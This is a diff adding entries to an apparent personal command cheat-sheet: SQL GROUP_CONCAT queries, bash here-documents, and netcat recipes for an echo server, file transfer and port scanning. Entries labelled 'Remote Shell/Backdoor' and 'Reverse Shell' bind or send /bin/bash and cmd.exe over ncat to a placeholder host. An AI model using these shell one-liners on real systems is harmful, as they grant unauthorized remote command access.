@@ -1136,6 +1136,8 @@ INSERT INTO table1 SELECT *, NOW(), "aaa" FROM table2 WHERE id=1;
 SELECT * FROM table ORDER BY alarm_id DESC LIMIT 10 ;
 SELECT * FROM table WHERE time > NOW() - INTERVAL 5 MINUTE;
 SELECT type, COUNT(type) FROM table WHERE time > (NOW() - INTERVAL 40 MINUTE) GROUP BY type;
+SELECT GROUP_CONCAT(id SEPARATOR ',' ) FROM table;
+SELECT GROUP_CONCAT( CONCAT( id, ' ', name, ' ', city, ' ', state) SEPARATOR ',')  from table;
 
 
 smbclient //192.168.2.2/share -U root%password
@@ -1186,3 +1188,50 @@ awk "{print \$$A}" 1.txt
 awk \{print\$$A\} 1.txt
 awk '{print $'$A'}' 1.txt
 awk '{print $'"$A"'}' 1.txt 
+
+
+Here strings
+cat <<< "hello world.."
+
+Here documents
+cat <<EOF
+hello world
+EOF
+
+ECHO Server:
+ncat -v -l -p 5555 -c 'while true; do read i && echo [echo] $i; done'
+Client:
+ncat -v -t 127.0.0.1 5555
+
+machine A - Send File
+cat happy.txt | ncat -v -l -p 5555
+machine B - Receive File
+ncat localhost 5555 > happy_copy.txt
+
+Port scanning
+nc -v -n -z -w 1 192.168.1.2 75-85
+
+Remote Shell/Backdoor
+Server:
+ncat -v -l -p 7777 -e /bin/bash
+ncat -v -l -n -p 8888 -e cmd.exe
+Client:
+nc localhost 7777
+
+Reverse Shell
+machine A
+ncat -v -l -p 8888
+machine B
+ncat A_ip 8888 -e /bin/bash
+
+
+#!/bin/bash
+{ myCode=$(</dev/stdin); } <<EOF
+ls
+pwd
+EOF
+echo "$myCode"
+eval "$myCode"
+
+
+
